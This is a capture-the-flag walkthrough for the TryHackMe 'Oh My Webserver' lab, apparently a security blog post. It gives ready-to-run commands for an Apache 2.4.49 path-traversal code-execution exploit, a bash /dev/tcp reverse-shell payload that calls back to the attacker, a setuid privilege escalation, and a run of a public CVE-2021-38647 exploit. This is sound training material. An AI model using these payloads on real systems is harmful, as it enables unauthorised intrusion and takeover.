---
title: "THM: Oh My Webserver"
date: 2025-03-02
categories: [CTF, Red Team]
tags: [CTF, Red Team]
permalink: /posts/ctf-oh-my-webserver
image:
  path: /assets/img/thumbnails/ctf-oh-my-webserver.png
---



### **Walkthrough**

#### **CTF Platform**: TryHackMe  
#### **Level**: Medium  

#### **Tools Used**:

  - `nmap`  
  - `curl`  
  - `metasploit`  
  - `netcat` (`nc`)  
  - Python3  
  - Exploit scripts (e.g., CVE-2021-38647)  

#### **Resources Used:**:

  - [Tryhackme](https://tryhackme.com/room/ohmyweb)
  - [Exploit-DB](https://www.exploit-db.com/)  
  - [CVE-2021-38647 GitHub Repository](https://github.com/AlteredSecurity/CVE-2021-38647)  


## **Steps for the CTF**

---

### **Task 1: Oh-My-Webserver**

#### **What is the User Flag?**

1. **Enumeration with Nmap**  
   Start by scanning the target machine using `nmap`. Use the following command to perform a service version detection scan:
   ```bash
   nmap -sSCV <IP>
   ```
   Analyze the results to identify open ports and services running on the target. Pay special attention to any unusual or outdated services.

2. **Research Vulnerabilities**  
   Based on the service versions identified during the scan, search for known vulnerabilities. For example, if Apache 2.4.49 is detected, use `searchsploit` to find relevant exploits:
   ```bash
   searchsploit Apache 2.4.49
   ```
   Visit the [Exploit-DB link](https://www.exploit-db.com/exploits/50383) to understand the exploit details.

3. **Exploiting the Vulnerability**  
   Use `curl` to exploit the vulnerability. Craft a payload to access sensitive files such as `/etc/passwd`. Here's an example of how to structure the request:
   ```bash
   curl -s --path-as-is -d "echo Content-Type: text/plain; echo; /etc/passwd" http://<IP>/cgibin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh
   ```
   Replace `<IP>` with the target machine's IP address. This step demonstrates how to traverse directories and execute commands.

4. **Establishing a Reverse Shell**  
   Set up a listener on your machine using `netcat`:
   ```bash
   nc -lvnp 4444
   ```
   Then, modify the `curl` command to send a reverse shell payload:
   ```bash
   curl 'http://<IP>/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash' --data 'echo Content-Type:text/plain; echo; bash -i >& /dev/tcp/<IP>/4444 0>&1'
   ```
   Once the connection is established, you will have a shell on the target machine.

5. **Privilege Escalation to Root**  
   Explore the system to locate the user flag. Use commands like `ls`, `ifconfig`, and `cat` to navigate and inspect files. For example:
   ```bash
   ls -la
   cat /root/user.txt
   ```
   To escalate privileges, try executing commands as root:
   ```bash
   python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
   ```

6. **Retrieve the User Flag**  
   The user flag is located in the `/root/user.txt` file. You can read it using:
   ```bash
   cat /root/user.txt
   ```

---

#### **What is the Root Flag?**

1. **Transferring Tools to the Target Machine**  
   If additional tools are required, transfer them to the target machine. For example, upload `nmap` to the `/tmp` directory:
   ```bash
   curl http://<my_own_IP>/nmap -o /tmp/nmap
   ```
   Use the uploaded tool to perform further enumeration:
   ```bash
   ./nmap -sSCV -p- 172.17.0.1
   ```

2. **Exploiting CVE-2021-38647**  
   Research the CVE-2021-38647 vulnerability and its exploit script. Clone the repository from GitHub:
   ```bash
   git clone https://github.com/AlteredSecurity/CVE-2021-38647
   ```
   Run the exploit script against the target:
   ```bash
   python3 CVE-2021-38647.py -t 172.17.0.1 -c 'whoami;pwd;id;hostname;uname -a;cat /root/root*'
   ```

3. **Retrieve the Root Flag**  
   The root flag is located in the `/root/root.txt` file. Use the exploit output or manually inspect the file to retrieve the flag.
